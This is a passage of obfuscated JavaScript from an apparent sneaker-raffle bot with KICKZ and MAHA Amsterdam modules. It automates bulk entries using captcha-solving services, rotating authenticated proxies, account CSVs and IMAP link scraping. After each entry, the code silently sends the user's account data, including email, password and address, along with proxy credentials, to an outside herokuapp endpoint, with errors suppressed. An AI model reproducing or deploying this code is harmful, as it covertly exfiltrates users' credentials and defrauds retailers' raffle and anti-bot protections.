                                _0x25dc75 = 'no', console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x5ca3b7['name'] + ']\x20Task\x20' + (_0x454909 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x5ca3b7['name'] + ']\x20Task\x20' + (_0x454909 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x307f0c) {
                            console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x5ca3b7['name'] + ']\x20Task\x20' + (_0x454909 + 0x1) + '\x20:\x20' + _0x307f0c)), _0xdb48eb[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0xdb48eb[0x0]['description'] = '' + _0x307f0c, await _0x5cd94d(_0xfda3c6, _0x2b9539), _0x25dc75 = 'yes';
                        } finally {
                            _0x5b7f39 && _0x5b7f39['close']();
                            if (_0x25dc75 == 'yes' && _0x28a705 != 0x5) {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x5ca3b7['name'] + ']\x20Task\x20' + (_0x454909 + 0x1) + '\x20:\x20Retrying\x20(' + _0x28a705 + '\x20/\x205)')), _0x454909 = _0x454909 - 0x1, _0x28a705 = _0x28a705 + 0x1;
                                continue;
                            }
                            _0x25dc75 == 'yes' && _0x28a705 >= 0x5 && (_0x3fe3d2(_0x5928e7[_0x454909], _0x5ca3b7), _0x25dc75 = 'no', _0x28a705 = 0x0), console['log']('Waiting\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0xe13069, _0x39857c, _0x4bad68) {
                    _0x1f8a8f['use'](_0x2f231a()), _0x1f8a8f['use'](_0x561a9c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1d78d4['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1547d2 = 0x0; _0x1547d2 < _0x39857c['length']; _0x1547d2++) {
                        var _0x253414;
                        if (_0x51640b != 'yes')
                            var _0x51640b = '', _0x20d9b5 = 0x0;
                        _0x3ec78c(_0xe13069['name'] + '\x20Task\x20' + (_0x1547d2 + 0x1) + '\x20/\x20' + _0x39857c['length'] + '\x20||\x20File:\x20' + _0x3fcfb6 + '\x20Proxies:\x20' + _0x1a359b);
                        var _0x1c971f = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5c7ae6
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x39857c[_0x1547d2]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x39857c[_0x1547d2]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x1d78d4['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x152cdf
                                }
                            ]
                        }];
                        let _0x17b45d = [
                            'Email',
                            'Password',
                            'FirstName',
                            'LastName',
                            'Size',
                            'Address1',
                            'HouseNumber',
                            'Zip',
                            'Country',
                            'City'
                        ], _0x342f93 = ![];
                        for (key of _0x17b45d) {
                            if (_0x39857c[_0x1547d2][key] == '' || !_0x39857c[_0x1547d2][key]) {
                                console['log'](_0x4ea3c7() + '\x20[' + _0xe13069['name'] + ']\x20Task\x20' + (_0x1547d2 + 0x1) + '\x20:\x20Invalid\x20CSV,\x20' + key + '\x20not\x20found'), _0x342f93 = !![];
                                break;
                            }
                        }
                        if (_0x342f93) {
                            await _0x73bf2c(0x1f4);
                            continue;
                        }
                        var _0x18b0c9 = await _0x1bd114(_0x39857c[_0x1547d2], _0xe13069, 'dev', ![]), _0x50dc88 = await _0x1bd114(_0x39857c[_0x1547d2], _0xe13069, 'pub', ![]);
                        const _0x24fb69 = {
                            'succesDEVMSG': { 'embeds': [_0x18b0c9] },
                            'succesPUBMSG': { 'embeds': [_0x50dc88] }
                        };
                        try {
                            await _0x4b6344(_0x39857c, _0x1547d2);
                        } catch {
                            _0x51640b = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x1d78d4['useRandomProxy'] = ![])
                            var _0x4b45fd = _0x4bad68[_0x1547d2]['split'](':');
                        else
                            var _0x55ed9d = Math['round'](Math['random']() * (_0x4bad68['length'] - 0x1)), _0x4b45fd = _0x4bad68[_0x55ed9d]['split'](':');
                        var _0xd12a11;
                        try {
                            _0xd12a11 = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x4b45fd[0x0] + ':' + _0x4b45fd[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xd12a11 = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x4b45fd[0x0] + ':' + _0x4b45fd[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5c30ce = await _0xd12a11['newPage']();
                            await _0x5c30ce['authenticate']({
                                'username': '' + _0x4b45fd[0x2],
                                'password': '' + _0x4b45fd[0x3]
                            }), console['log'](_0x4ea3c7() + '\x20[' + _0xe13069['name'] + ']\x20Task\x20' + (_0x1547d2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5c30ce['setRequestInterception'](!![]), _0x5c30ce['on']('request', _0x563757 => {
                                _0x563757['resourceType']() === 'image' || _0x563757['resourceType']() === 'font' || _0x563757['resourceType']() === 'media' ? _0x563757['abort']() : _0x563757['continue']();
                            }), await _0x5c30ce['goto']('' + _0x39857c[_0x1547d2]['Url']['replace']('\x20', ''), { 'waitUntil': 'networkidle2' }), await _0x73bf2c(0x12c), await _0x5c30ce['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5c30ce['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x73bf2c(0x7d0);
                            try {
                                await _0x5c30ce['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x5c30ce['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x4ea3c7() + '\x20[' + _0xe13069['name'] + ']\x20Task\x20' + (_0x1547d2 + 0x1) + '\x20:\x20Logging\x20in'), await _0x5c30ce['waitForSelector']('#username'), await _0x5c30ce['type']('#username', _0x39857c[_0x1547d2]['Email']), await _0x5c30ce['waitForSelector']('#password'), await _0x5c30ce['type']('#password', _0x39857c[_0x1547d2]['Password']), await _0x73bf2c(0x190), await _0x5c30ce['click']('#buttonSubmit'), await _0x5c30ce['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x4ea3c7() + '\x20[' + _0xe13069['name'] + ']\x20Task\x20' + (_0x1547d2 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x73bf2c(0x1f4), console['log'](_0x4ea3c7() + '\x20[' + _0xe13069['name'] + ']\x20Task\x20' + (_0x1547d2 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x39857c[_0x1547d2]['Size']);
                            let _0x372b70 = _0x39857c[_0x1547d2]['Size']['replace']('.5', '\x201/2');
                            if (_0x372b70['toUpperCase']() == 'RANDOM') {
                                const _0x252140 = await _0x5c30ce['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x46537d = Math['round'](Math['random']() * (_0x252140['length'] - 0x1));
                                await _0x252140[_0x46537d]['click']();
                            } else
                                await _0x5c30ce['click']('button[aria-label=\x22' + _0x372b70 + '\x22]');
                            await _0x73bf2c(0x1f4);
                            try {
                                await _0x5c30ce['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x73bf2c(0x12c), console['log'](_0x4ea3c7() + '\x20[' + _0xe13069['name'] + ']\x20Task\x20' + (_0x1547d2 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5c30ce['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x73bf2c(0x12c), await _0x5c30ce['type']('#dwfrm_raffle_addressFields_firstName', _0x39857c[_0x1547d2]['FirstName']), await _0x73bf2c(0x12c), await _0x5c30ce['type']('#dwfrm_raffle_addressFields_lastName', _0x39857c[_0x1547d2]['LastName']), await _0x73bf2c(0x12c), await _0x5c30ce['select']('#dwfrm_raffle_addressFields_country', _0x39857c[_0x1547d2]['Country']), await _0x73bf2c(0x12c), await _0x5c30ce['type']('#dwfrm_raffle_addressFields_city', _0x39857c[_0x1547d2]['City']), await _0x73bf2c(0x12c);
                            _0x39857c[_0x1547d2]['Postcode'] == undefined && (_0x39857c[_0x1547d2]['Postcode'] = _0x39857c[_0x1547d2]['Zip']);
                            await _0x5c30ce['type']('#dwfrm_raffle_addressFields_postalCode', _0x39857c[_0x1547d2]['Postcode']), await _0x73bf2c(0x12c), await _0x5c30ce['type']('#dwfrm_raffle_addressFields_address1', _0x39857c[_0x1547d2]['Address1']), await _0x73bf2c(0x12c), await _0x5c30ce['type']('#dwfrm_raffle_addressFields_address2', _0x39857c[_0x1547d2]['HouseNumber']), await _0x73bf2c(0x12c), await _0x5c30ce['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x39857c[_0x1547d2]['Address2']), await _0x73bf2c(0x12c), await _0x5c30ce['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x73bf2c(0x12c), await _0x5c30ce['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x39857c[_0x1547d2]['Follower']), await _0x73bf2c(0x1f4), await _0x5c30ce['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x73bf2c(0x1f4), console['log'](_0x4ea3c7() + '\x20[' + _0xe13069['name'] + ']\x20Task\x20' + (_0x1547d2 + 0x1) + '\x20:\x20' + _0x11085b['blue']('Awaiting\x20Paypal\x20Payment')), await _0x5c30ce['click']('.b-paypal_button');
                            try {
                                await _0x5c30ce['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x51640b = 'no', _0x5584d0(_0x39857c[_0x1547d2], _0xe13069), console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0xe13069['name'] + ']\x20Task\x20' + (_0x1547d2 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x24fb69['succesDEVMSG']);
                                await _0x73bf2c(0xc8), await _0x5cd94d(_0x492271, _0x24fb69['succesDEVMSG']), await _0x73bf2c(0xc8), await _0x5cd94d(_0x323e07, _0x24fb69['succesPUBMSG']);
                                let _0x59ac23 = _0x39857c[_0x1547d2];
                                try {
                                    prxdata = {
                                        'username': _0x5c7ae6['replace']('#', ''),
                                        'module': _0xe13069['name'],
                                        'entrydata': JSON['stringify'](_0x59ac23),
                                        'proxy': '' + _0x4bad68[_0x1547d2]
                                    };
                                    var _0x264af3 = JSON['stringify'](prxdata);
                                    let _0x5cb9cf = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3d9190['post']('https://jraffles.herokuapp.com/success', _0x264af3, _0x5cb9cf);
                                } catch (_0x44473d) {
                                }
                            } catch (_0x5de283) {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0xe13069['name'] + ']\x20Task\x20' + (_0x1547d2 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x5de283)), _0x253414 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x5de283;
                                var _0x12837f = await _0x1bd114(_0x39857c[_0x1547d2], _0xe13069, 'dev', !![], _0x253414);
                                _0x24fb69['errorDEV'] = { 'embeds': [_0x12837f] }, _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x24fb69['errorDEV']), await _0x5cd94d(_0xfda3c6, _0x24fb69['errorDEV']);
                            }
                        } catch (_0x12f620) {
                            console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0xe13069['name'] + ']\x20Task\x20' + (_0x1547d2 + 0x1) + '\x20:\x20' + _0x12f620)), _0x253414 = '' + _0x12f620;
                            var _0x12837f = await _0x1bd114(_0x39857c[_0x1547d2], _0xe13069, 'dev', !![], _0x253414);
                            _0x24fb69['errorDEV'] = { 'embeds': [_0x12837f] }, _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x24fb69['errorDEV']), await _0x5cd94d(_0xfda3c6, _0x24fb69['errorDEV']), _0x51640b = 'yes';
                        } finally {
                            _0xd12a11 && _0xd12a11['close']();
                            if (_0x51640b == 'yes' && _0x20d9b5 != 0x5) {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0xe13069['name'] + ']\x20Task\x20' + (_0x1547d2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x20d9b5 + '\x20/\x205)')), _0x1547d2 = _0x1547d2 - 0x1, _0x20d9b5 = _0x20d9b5 + 0x1;
                                continue;
                            }
                            _0x51640b == 'yes' && _0x20d9b5 >= 0x5 && (_0x3fe3d2(_0x39857c[_0x1547d2], _0xe13069), _0x51640b = 'no', _0x20d9b5 = 0x0), console['log']('Waiting\x20for\x20' + _0x1d78d4['AfewDelay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x2023b9, _0x5e3ff1, _0x1d86fb) {
                    for (var _0xeda381 = 0x0; _0xeda381 < _0x5e3ff1['length']; _0xeda381++) {
                        try {
                            await _0x4b6344(_0x5e3ff1, _0xeda381);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x14263a(_0x7e45d7, _0x28a243, _0x3223ba, _0x79ddb0, _0x22c6f0) {
                            var _0x593ef5, _0x3bb0cd = {}, _0x552b01 = [], _0x4b63b8 = {}, _0x31f266 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0xa3f15e = Math['round'](Math['random']() * (_0x31f266['length'] - 0x1));
                            !_0x79ddb0 && (_0x79ddb0 = {});
                            if (_0x28a243 != 'ver') {
                                _0x3ec78c(_0x3223ba['name'] + '\x20Task\x20' + (_0x7e45d7 + 0x1) + '\x20/\x20' + _0x79ddb0['length'] + '\x20||\x20File:\x20' + _0x3fcfb6 + '\x20Proxies:\x20' + _0x1a359b), await _0x4b6344(_0x79ddb0, _0x7e45d7), _0x3bb0cd = _0x3223ba['data'], _0x3bb0cd['data']['attributes']['email'] = '' + _0x79ddb0[_0x7e45d7]['Email'];
                                if (_0x79ddb0[_0x7e45d7]['Size'] == 'RANDOM') {
                                }
                                _0x3bb0cd['data']['attributes']['properties']['$first_name'] = '' + _0x79ddb0[_0x7e45d7]['FirstName'], _0x3bb0cd['data']['attributes']['properties']['$last_name'] = '' + _0x79ddb0[_0x7e45d7]['LastName'], _0x3bb0cd['data']['attributes']['properties']['$address1'] = _0x79ddb0[_0x7e45d7]['Address1'] + '\x20' + _0x79ddb0[_0x7e45d7]['Address2'] + '\x20' + _0x79ddb0[_0x7e45d7]['HouseNumber'], _0x3bb0cd['data']['attributes']['properties']['$zip'] = '' + _0x79ddb0[_0x7e45d7]['Zip'], _0x3bb0cd['data']['attributes']['properties']['$city'] = '' + _0x79ddb0[_0x7e45d7]['City'], _0x3bb0cd['data']['attributes']['properties']['$country'] = '' + _0x79ddb0[_0x7e45d7]['Country'], _0x79ddb0[_0x7e45d7]['Size'] == 'RANDOM' ? _0x3bb0cd['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x31f266[_0xa3f15e] : _0x3bb0cd['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x79ddb0[_0x7e45d7]['Size'], _0x3bb0cd['data']['attributes']['properties']['$phone_number'] = '' + _0x79ddb0[_0x7e45d7]['Phone'], _0x3bb0cd['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x79ddb0[_0x7e45d7]['Follower'];
                            }
                            if (_0x1d78d4['useRandomProxy'] = ![])
                                var _0x45743b = _0x22c6f0[_0x7e45d7]['split'](':');
                            else
                                var _0x1c1746 = Math['round'](Math['random']() * (_0x22c6f0['length'] - 0x1)), _0x45743b = _0x22c6f0[_0x1c1746]['split'](':');
                            var _0xfa483e = {
                                'jar': _0x27c7cf,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x3223ba['url'],
                                'headers': _0x3223ba['headers'],
                                'body': JSON['stringify'](_0x3bb0cd),
                                'proxy': 'http://' + _0x45743b[0x2] + ':' + _0x45743b[0x3] + '@' + _0x45743b[0x0] + ':' + _0x45743b[0x1]
                            };
                            return _0x28a243 != 'ver' && (_0xfa483e['url'] = _0x3223ba['url'], _0xfa483e['headers'] = _0x3223ba['headers']), _0x28a243 == 'ver' && (_0xfa483e['method'] = 'GET'), new Promise(function (_0x53fb68, _0x529e59) {
                                callback = async (_0x54f05f, _0x45ca57, _0x2dc463) => {
                                    if (!_0x54f05f && _0x45ca57['statusCode'] == 0xca || !_0x54f05f && _0x45ca57['statusCode'] == 0xc8) {
                                        if (_0x28a243 != 'ver') {
                                            var _0xa73bb9 = await _0x1bd114(_0x79ddb0[_0x7e45d7], _0x3223ba, 'dev', ![]), _0x4cf7ff = await _0x1bd114(_0x79ddb0[_0x7e45d7], _0x3223ba, 'pub', ![]);
                                            const _0x465caf = {
                                                'succesDEVMSG': { 'embeds': [_0xa73bb9] },
                                                'succesPUBMSG': { 'embeds': [_0x4cf7ff] }
                                            };
                                            let _0x29dbf4 = _0x79ddb0[_0x7e45d7];
                                            try {
                                                prxdata = {
                                                    'username': _0x5c7ae6['replace']('#', ''),
                                                    'module': _0x3223ba['name'],
                                                    'entrydata': JSON['stringify'](_0x29dbf4),
                                                    'proxy': '' + _0x22c6f0[_0x7e45d7]
                                                };
                                                var _0x34fbda = JSON['stringify'](prxdata);
                                                let _0x364f16 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x3d9190['post']('https://jraffles.herokuapp.com/success', _0x34fbda, _0x364f16);
                                            } catch (_0x37472d) {
                                            }
                                            if (_0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '')
                                                try {
                                                    await _0x5cd94d(_0x1d78d4['webhook'], _0x465caf['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x73bf2c(0xc8), await _0x5cd94d(_0x492271, _0x465caf['succesDEVMSG']), await _0x73bf2c(0xc8);
                                            try {
                                                await _0x5cd94d(_0x323e07, _0x465caf['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x5584d0(_0x79ddb0[_0x7e45d7], _0x3223ba);
                                        }
                                        _0x53fb68(console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x3223ba['name'] + ']\x20Task\x20' + (_0x7e45d7 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x28a243 != 'ver') {
                                            var _0x5b560d = '' + _0x54f05f, _0x268c53 = await _0x1bd114(_0x79ddb0[_0x7e45d7], _0x3223ba, 'dev', !![], _0x5b560d), _0x5cbbbd = {};
                                            _0x5cbbbd['errorDEV'] = { 'embeds': [_0x268c53] }, _0x3fe3d2(_0x79ddb0[_0x7e45d7], _0x3223ba), _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x5cbbbd['errorDEV']), await _0x5cd94d(_0xfda3c6, _0x5cbbbd['errorDEV']);
                                        }
                                        _0x529e59(console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x3223ba['name'] + ']\x20Task\x20' + (_0x7e45d7 + 0x1) + ':\x20' + _0x54f05f)));
                                    }
                                };
                                try {
                                    _0x28a243 != 'ver' && console['log'](_0x4ea3c7() + '\x20[' + _0x3223ba['name'] + ']\x20Task\x20' + (_0x7e45d7 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3bb0cd['data']['attributes']['email']), _0x31e459(_0xfa483e, callback);
                                } catch (_0x3d8373) {
                                    console['log'](_0x4ea3c7() + '\x20Task\x20' + (_0x7e45d7 + 0x1) + ':\x20' + _0x3d8373);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x14263a(_0xeda381, 'nor', _0x2023b9, _0x5e3ff1, _0x1d86fb), console['log'](_0x4ea3c7() + '\x20[' + _0x2023b9['name'] + ']\x20Sleeping\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay']);
                        } catch (_0x35ab64) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x28ba03, _0x29b82a, _0x245f2a) {
                    var _0x3a9c23 = [], _0x20fc56 = ![];
                    async function _0x2b8810() {
                        var _0x427843 = new _0x10db71({
                            'user': _0x1d78d4['masterMail'],
                            'password': _0x1d78d4['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x443d21(_0x159aa1) {
                            _0x427843['openBox']('INBOX', ![], _0x159aa1);
                        }
                        _0x427843['once']('ready', function () {
                            _0x443d21(function (_0x4a8b48, _0x220535) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x4a8b48)
                                    throw _0x4a8b48;
                                _0x427843['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x109fa4, _0x27c71d) {
                                    if (!_0x27c71d || !_0x27c71d['length'])
                                        console['log'](_0x4ea3c7() + '\x20[' + _0x28ba03['name'] + ']\x20No\x20mails\x20found'), _0x427843['end']();
                                    else {
                                        var _0x5e1ae4 = _0x427843['seq']['fetch'](_0x27c71d, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x5e1ae4['on']('message', function (_0x1eb4ae, _0x2fb58d) {
                                            var _0x380550 = '(#' + _0x2fb58d + ')\x20';
                                            _0x1eb4ae['on']('body', function (_0x2a5bfc, _0x2c6fbc) {
                                                _0xd18e10(_0x2a5bfc, (_0xd4078b, _0x1ba8be) => {
                                                    var _0x49fe88 = _0x1ba8be['text']['split']('(')[0x1], _0x3c139e = _0x49fe88['split'](')')[0x0];
                                                    _0x3a9c23['push'](_0x3c139e);
                                                });
                                            }), _0x1eb4ae['once']('end', function () {
                                            });
                                        }), _0x5e1ae4['once']('error', function (_0x53ad68) {
                                            console['log']('Fetch\x20error:\x20' + _0x53ad68), _0x20fc56 = !![];
                                        }), _0x5e1ae4['once']('end', function () {
                                            _0x427843['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x427843['once']('error', function (_0x142d0c) {
                            console['log'](_0x11085b['red'](_0x142d0c['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x20fc56 = !![];
                        }), _0x427843['once']('end', async function () {
                            _0x20fc56 = !![];
                        }), _0x427843['connect']();
                    }
                    async function _0xca286e(_0xd6c76f, _0x421a10, _0x998f33) {
                        for (var _0x24aa41 = 0x0; _0x24aa41 < _0x421a10['length']; _0x24aa41++) {
                            async function _0x55b553(_0x318451, _0x18832a, _0x45b3c8, _0x5a1533, _0x13324a) {
                                var _0x184ca3, _0x1682d2 = {}, _0xde2fa7 = [], _0x3038bb = {}, _0x23b9e5 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x215e39 = Math['round'](Math['random']() * (_0x23b9e5['length'] - 0x1));
                                _0x5a1533[_0x318451]['Size'] == 'RANDOM' && (_0x5a1533[_0x318451]['Size'] = _0x23b9e5[_0x215e39]);
                                !_0x5a1533 && (_0x5a1533 = {});
                                if (_0x1d78d4['useRandomProxy'] = ![])
                                    var _0x39c85f = _0x13324a[_0x318451]['split'](':');
                                else
                                    var _0x4b4ea3 = Math['round'](Math['random']() * (_0x13324a['length'] - 0x1)), _0x39c85f = _0x13324a[_0x4b4ea3]['split'](':');
                                var _0x255632 = {
                                    'jar': _0x27c7cf,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x45b3c8['url'],
                                    'headers': _0x45b3c8['headers'],
                                    'body': JSON['stringify'](_0x1682d2),
                                    'proxy': 'http://' + _0x39c85f[0x2] + ':' + _0x39c85f[0x3] + '@' + _0x39c85f[0x0] + ':' + _0x39c85f[0x1]
                                };
                                return _0x18832a != 'ver' && (_0x255632['url'] = _0x45b3c8['url'], _0x255632['headers'] = _0x45b3c8['headers']), _0x18832a == 'ver' && (_0x255632['method'] = 'GET', _0x255632['url'] = _0x5a1533[_0x318451]), new Promise(function (_0x56b6a6, _0x55f77b) {
                                    callback = async (_0x85fe53, _0x318ff1, _0x179471) => {
